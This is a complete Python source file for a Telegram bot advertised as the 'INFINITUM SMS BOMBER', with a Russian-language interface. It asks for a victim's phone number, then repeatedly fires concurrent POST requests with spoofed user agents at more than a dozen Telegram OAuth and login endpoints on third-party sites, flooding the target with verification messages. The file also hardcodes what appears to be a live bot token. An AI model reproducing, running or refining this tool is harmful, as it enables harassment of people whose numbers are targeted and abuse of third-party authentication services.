import asyncio
import re
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from fake_useragent import UserAgent
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8405247051:AAGy5KEes_ngcTTsBohoiWydavx3uKgOjK0"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_attacks = {}
user_messages = {}

class AttackState(StatesGroup):
    awaiting_phone = State()
    awaiting_attempts = State()

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

def is_valid_phone(phone):
    pattern = r'^\+?[0-9]{10,15}$'
    return bool(re.match(pattern, str(phone)))

async def send_request(session, url, phone, user_agent):
    try:
        async with session.post(url, headers={'user-agent': user_agent}, data={'phone': phone}, timeout=10) as response:
            return response.status == 200
    except:
        return False

async def cleanup_user_messages(user_id):
    if user_id in user_messages:
        for msg_id in user_messages[user_id]:
            try:
                await bot.delete_message(user_id, msg_id)
            except:
                pass
        user_messages[user_id] = []

async def save_message_id(user_id, message_id):
    if user_id not in user_messages:
        user_messages[user_id] = []
    user_messages[user_id].append(message_id)

async def run_attack(phone, attempts, user_id, message_id):
    total_success = 0
    user_agent = UserAgent().random
    
    async with aiohttp.ClientSession() as session:
        for attempt in range(1, attempts + 1):
            if user_id not in active_attacks:
                break
                
            success_count = 0
            tasks = []
            
            for url in ATTACK_URLS:
                tasks.append(send_request(session, url, phone, user_agent))
            
            results = await asyncio.gather(*tasks)
            success_count = sum(results)
            total_success += success_count
            
            progress_percent = int((success_count / len(ATTACK_URLS)) * 100)
            progress_bar = "🟢" * int(progress_percent / 10) + "⚪" * (10 - int(progress_percent / 10))
            
            stats_text = f"""
⚡️ <b>INFINITUM ATTACK PROGRESS</b> ⚡️

┏━━━━━━━━━━━━━━━━━━━━━━━
┃ 📞 <b>Цель:</b> <code>{phone}</code>
┃ 📊 <b>Попытка:</b> {attempt}/{attempts}
┃ ✅ <b>Успешно:</b> {success_count}/{len(ATTACK_URLS)}
┃ 🔥 <b>Всего:</b> {total_success}
┗━━━━━━━━━━━━━━━━━━━━━━━

{progress_bar} {progress_percent}%

⏰ <b>Начато:</b> {datetime.now().strftime('%H:%M:%S')}
            """
            
            try:
                await bot.edit_message_text(
                    chat_id=user_id,
                    message_id=message_id,
                    text=stats_text,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Error editing message: {e}")
            
            if attempt < attempts:
                await asyncio.sleep(5)
    
    return total_success

def main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎯 Начать атаку"), KeyboardButton(text="📊 Статистика")],
            [KeyboardButton(text="❓ Помощь"), KeyboardButton(text="🛑 Остановить атаку")]
        ],
        resize_keyboard=True,
        input_field_placeholder="Выберите действие..."
    )
    return keyboard

def cancel_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="❌ Отмена")]],
        resize_keyboard=True
    )
    return keyboard

def back_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🔙 Вернуться в меню")]],
        resize_keyboard=True
    )
    return keyboard

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await cleanup_user_messages(message.from_user.id)
    
    welcome_text = """
 <b>INFINITUM SMS BOMBER</b> 
<i>by @jadddxxx</i>

 <b>Мощный SMS спаммер для Telegram</b>

<b>Возможности:</b>
• Ультра-быстрые асинхронные атаки
• Поддержка множественных целей
• Красивый интерфейс

👉 <b>Нажмите 'Начать атаку' чтобы начать</b>
    """
    
    msg = await message.answer_animation(
        animation="https://i.imgur.com/95JCSDE.gif",
        caption=welcome_text,
        parse_mode='HTML',
        reply_markup=main_keyboard()
    )
    await save_message_id(message.from_user.id, msg.message_id)

@dp.message(F.text == "🔙 Вернуться в меню")
async def back_to_menu(message: Message):
    await cleanup_user_messages(message.from_user.id)
    await cmd_start(message)

@dp.message(F.text == "❓ Помощь")
@dp.message(Command("help"))
async def cmd_help(message: Message):
    await cleanup_user_messages(message.from_user.id)
    
    help_text = """
📖 <b>Помощь INFINITUM | Spam</b>

<b>Как использовать:</b>
1. Нажмите 'Начать атаку'
2. Введите номер телефона цели
3. Укажите количество попыток (1-20)
4. Дождитесь завершения атаки

🔧 <b>Поддержка:</b>
@jadddxxx
    """
    
    msg = await message.answer_animation(
        animation="https://i.imgur.com/95JCSDE.gif",
        caption=help_text,
        parse_mode='HTML',
        reply_markup=back_keyboard()
    )
    await save_message_id(message.from_user.id, msg.message_id)

@dp.message(F.text == "🎯 Начать атаку")
@dp.message(Command("attack"))
async def cmd_attack(message: Message, state: FSMContext):
    await cleanup_user_messages(message.from_user.id)
    
    user_id = message.from_user.id
    
    if user_id in active_attacks:
        msg = await message.answer("⚠️ У вас уже есть активная атака. Используйте /stop чтобы отменить её.")
        await save_message_id(user_id, msg.message_id)
        return
    
    attack_text = """
🔻 <b>Номер телефона жертвы</b> 🔻

📞 <b>Введите номер телефона цели:</b>

🌍 <b>Формат:</b> <code>+79123456789</code> или <code>79123456789</code>
    """
    
    msg = await message.answer(attack_text, parse_mode='HTML', reply_markup=cancel_keyboard())
    await save_message_id(user_id, msg.message_id)
    await state.set_state(AttackState.awaiting_phone)

@dp.message(AttackState.awaiting_phone)
async def process_phone(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await cleanup_user_messages(message.from_user.id)
        await cmd_start(message)
        return
        
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        msg = await message.answer("❌ Неверный формат номера. Пожалуйста, введите корректный номер:")
        await save_message_id(message.from_user.id, msg.message_id)
        return
    
    await state.update_data(phone=phone)
    
    attempts_text = """
📊 <b>Сколько будем отправлять ?</b>

⚡️ <b>Введите количество попыток (1-20):</b>

💡 <b>Рекомендуется:</b> 5-10 попыток
    """
    
    msg = await message.answer(attempts_text, parse_mode='HTML', reply_markup=cancel_keyboard())
    await save_message_id(message.from_user.id, msg.message_id)
    await state.set_state(AttackState.awaiting_attempts)

@dp.message(AttackState.awaiting_attempts)
async def process_attempts(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await cleanup_user_messages(message.from_user.id)
        await cmd_start(message)
        return
        
    user_id = message.from_user.id
    
    try:
        attempts = int(message.text.strip())
        if attempts < 1 or attempts > 20:
            msg = await message.answer("❌ Пожалуйста, введите число от 1 до 20:")
            await save_message_id(user_id, msg.message_id)
            return
    except ValueError:
        msg = await message.answer("❌ Пожалуйста, введите корректное число:")
        await save_message_id(user_id, msg.message_id)
        return
    
    data = await state.get_data()
    phone = data.get('phone')
    
    if not phone:
        msg = await message.answer("❌ Ошибка: номер телефона не найден. Начните заново с /attack")
        await save_message_id(user_id, msg.message_id)
        await state.clear()
        return
    
    stats_message = await message.answer("""
⚡️ <b>INFINITUM ATTACK STARTING</b> ⚡️

┏━━━━━━━━━━━━━━━━━━━━━━━
┃ 📞 <b>Цель:</b> <code>Загрузка...</code>
┃ 📊 <b>Попытка:</b> 0/0
┃ ✅ <b>Успешно:</b> 0/0
┃ 🔥 <b>Всего:</b> 0
┗━━━━━━━━━━━━━━━━━━━━━━━

⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪ 0%

⏰ <b>Начато:</b> Загрузка...
    """, parse_mode='HTML')
    await save_message_id(user_id, stats_message.message_id)
    
    active_attacks[user_id] = True
    await state.clear()
    
    total_success = await run_attack(phone, attempts, user_id, stats_message.message_id)
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    total_requests = attempts * len(ATTACK_URLS)
    success_rate = (total_success / total_requests * 100) if total_requests > 0 else 0
    
    finish_text = f"""
 <b>Спам успешно сроботал. </b> 

┏━━━━━━━━━━━━━━━━━━━━━━━
┃ 📞 <b>Цель:</b> <code>{phone}</code>
┃ 🔥 <b>Всего успешно:</b> {total_success}
┃ ✅ <b>Процент успеха:</b> {success_rate:.1f}%
┃ ⏰ <b>Завершено:</b> {datetime.now().strftime('%H:%M:%S')}
┗━━━━━━━━━━━━━━━━━━━━━━━

💥 <b>Атака успешно завершена!</b>

Нажмите '🎯 Начать атаку' для новой атаки
    """
    
    try:
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=stats_message.message_id,
            text=finish_text,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Error editing message: {e}")
        msg = await message.answer(finish_text, parse_mode='HTML')
        await save_message_id(user_id, msg.message_id)
    
    await cleanup_user_messages(user_id)
    await message.answer("✅ Атака завершена!", reply_markup=main_keyboard())

@dp.message(F.text == "🛑 Остановить атаку")
@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    user_id = message.from_user.id
    
    if user_id in active_attacks:
        del active_attacks[user_id]
        await message.answer("🛑 Атака успешно остановлена.", reply_markup=main_keyboard())
    else:
        await message.answer("❌ Активных атак не найдено.", reply_markup=main_keyboard())

@dp.message(F.text == "📊 Статистика")
@dp.message(Command("stats"))
async def cmd_stats(message: Message):
    await cleanup_user_messages(message.from_user.id)
    
    stats_text = f"""
📊 <b>Статистика Бота.</b>
┏━━━━━━━━━━━━━━━━━━━━━━━
┃ 👥 <b>Активные пользователи:</b> {len(active_attacks)}
┃ 🎯 <b>Активные атаки:</b> {len(active_attacks)}
┃ 🌐 <b>Целевые URL:</b> {len(ATTACK_URLS)}
┃ ⏰ <b>Время сервера:</b> {datetime.now().strftime('%H:%M:%S')}
┗━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    msg = await message.answer_animation(
        animation="https://i.imgur.com/95JCSDE.gif",
        caption=stats_text,
        parse_mode='HTML',
        reply_markup=back_keyboard()
    )
    await save_message_id(message.from_user.id, msg.message_id)

@dp.message()
async def handle_other_messages(message: Message, state: FSMContext):
    current_state = await state.get_state()
    
    if current_state is None:
        msg = await message.answer("💡 Используйте кнопки ниже для навигации или /help для инструкций", reply_markup=main_keyboard())
        await save_message_id(message.from_user.id, msg.message_id)
    else:
        msg = await message.answer("❌ Пожалуйста, завершите текущую операцию или нажмите '❌ Отмена'")
        await save_message_id(message.from_user.id, msg.message_id)

@dp.errors()
async def errors_handler(update, error):
    logger.error(f"Update {update} caused error {error}")
    return True

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())